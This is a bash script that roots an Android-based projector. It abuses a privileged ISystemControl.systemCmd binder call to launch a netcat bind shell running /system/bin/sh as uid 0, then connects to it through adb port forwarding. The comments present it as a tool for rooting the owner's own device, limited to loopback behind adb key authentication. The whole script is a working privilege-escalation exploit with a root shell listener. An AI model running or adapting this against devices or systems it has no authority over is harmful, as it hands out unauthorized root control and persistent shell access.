#!/usr/bin/env bash
# Root shell on the projector without "adb root" (impossible on this user build).
#
# Starts a loopback-only listener as uid 0 through ISystemControl.systemCmd
# (transact 386 on the @1.1 interface), then reaches it through `adb forward`,
# so access still requires adb key auth. Dies on reboot; rerun to recreate.
#
# usage: ./pjroot.sh                 interactive root shell
#        ./pjroot.sh 'id; getprop'   one-off command
set -u
cd "$(dirname "$0")"
PORT=12345
PJ_HOST="${PJ_HOST:-<PROJECTOR_IP>}"
export PJ_HOST

forward() {
  adb forward --list 2>/dev/null | grep -q "tcp:$PORT tcp:$PORT" && return 0
  adb connect "$PJ_HOST:5555" >/dev/null 2>&1
  adb forward "tcp:$PORT" "tcp:$PORT" >/dev/null 2>&1
}

alive() {
  python3 - "$PORT" <<'PY' 2>/dev/null
import socket, sys
s = socket.create_connection(("127.0.0.1", int(sys.argv[1])), 1.5)
s.sendall(b"exit\n"); s.close()
PY
}

start_listener() {
  python3 - "$PORT" <<'PY' > /tmp/opencode/pjroot_gen.py
import sys
port = sys.argv[1]
src = open('sc_cmd.py').read()
cmd = ("setsid /system/bin/nc -s 127.0.0.1 -p %s -L /system/bin/sh -l "
       "</dev/null >/dev/null 2>&1 &" % port)
src = src.replace('ARGS = ["id > /data/data/org.xbmc.kodi/cache/syscmd_id.txt"]',
                  'ARGS = [%r]' % cmd)
print(src)
PY
  mkdir -p /tmp/opencode
  python3 -I pjeval.py < /tmp/opencode/pjroot_gen.py >/dev/null 2>&1
  sleep 1
}

forward
if ! alive; then
  start_listener
  alive || { echo "root listener did not come up" >&2; exit 1; }
fi

if [ $# -gt 0 ]; then
  python3 - "$PORT" "$*" <<'PY'
import socket, sys
s = socket.create_connection(("127.0.0.1", int(sys.argv[1])), 5)
s.sendall(sys.argv[2].encode() + b"\nexit\n")
out = b""
try:
    while True:
        d = s.recv(4096)
        if not d: break
        out += d
except socket.timeout:
    pass
sys.stdout.write(out.decode("utf-8", "replace"))
PY
else
  if command -v socat >/dev/null; then
    exec socat -,raw,echo=0 "TCP:127.0.0.1:$PORT"
  else
    exec nc "127.0.0.1" "$PORT"
  fi
fi
